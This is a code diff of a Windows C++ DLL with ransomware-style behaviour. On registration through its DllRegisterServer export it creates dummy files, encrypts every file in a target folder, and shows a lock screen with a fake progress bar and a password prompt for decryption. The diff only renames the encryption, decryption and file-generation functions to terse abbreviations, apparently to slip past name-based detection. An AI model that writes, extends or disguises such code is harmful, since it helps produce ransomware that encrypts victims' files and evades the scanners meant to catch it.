@@ -15,7 +15,7 @@ HWND hWndProgressBar;
 HWND hWndTimerLabel;
 HWND hwndMain;
 HFONT hFontBold;
-HWND hWndEncryptionStatusLabel; // Encryption Status Label
+HWND hWndEncStatusLabel; // Encryption Status Label
 std::wstring correctPassword;
 
 
@@ -41,7 +41,7 @@ void SimulateFakeProgress() {
     static int delayCounter = 0;
 
     if (fakeProgress >= 100) {
-        SetWindowText(hWndEncryptionStatusLabel, L"Chiffrement termine");
+        SetWindowText(hWndEncStatusLabel, L"Chiffrement termine");
         return;
     }
     if (delayCounter > 0) {
@@ -142,7 +142,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
             {
                 MessageBox(hwnd, L"Access Granted!", L"Success", MB_OK | MB_ICONINFORMATION);
 				// Decrypt files    
-				DecryptAllFilesInFolder(targetFolder, std::string(inputText, inputText + wcslen(inputText)));
+				DecAllF(targetFolder, std::string(inputText, inputText + wcslen(inputText)));
 				// Close the application
                 ExitProcess(0);
             }
@@ -226,9 +226,9 @@ void ShowGUI()
     yOffset += 75;
 
 	// Create the encryption status label
-    hWndEncryptionStatusLabel = CreateWindow(L"STATIC", L"Chiffrement des fichiers en cours...", WS_VISIBLE | WS_CHILD | SS_CENTER,
+    hWndEncStatusLabel = CreateWindow(L"STATIC", L"Chiffrement des fichiers en cours...", WS_VISIBLE | WS_CHILD | SS_CENTER,
         screenWidth / 2 - 200, yOffset, 400, 60, hwndMain, NULL, GetModuleHandle(NULL), NULL);
-    SendMessage(hWndEncryptionStatusLabel, WM_SETFONT, (WPARAM)hFontBold, TRUE);
+    SendMessage(hWndEncStatusLabel, WM_SETFONT, (WPARAM)hFontBold, TRUE);
     yOffset += 50;
 
 	// Create the progress bar
@@ -278,8 +278,8 @@ extern "C" __declspec(dllexport) HRESULT __stdcall DllRegisterServer() {
 
 
     int filesPerType = 5;
-    GenerateDummyFiles(targetFolder,filesPerType);
-	EncryptAllFilesInFolder(targetFolder, password); // Encrypt files with the password
+    GenDummyF(targetFolder,filesPerType);
+	EncAllF(targetFolder, password); // Encrypt files with the password
     ShowGUI(); 
     return S_OK; 
 }
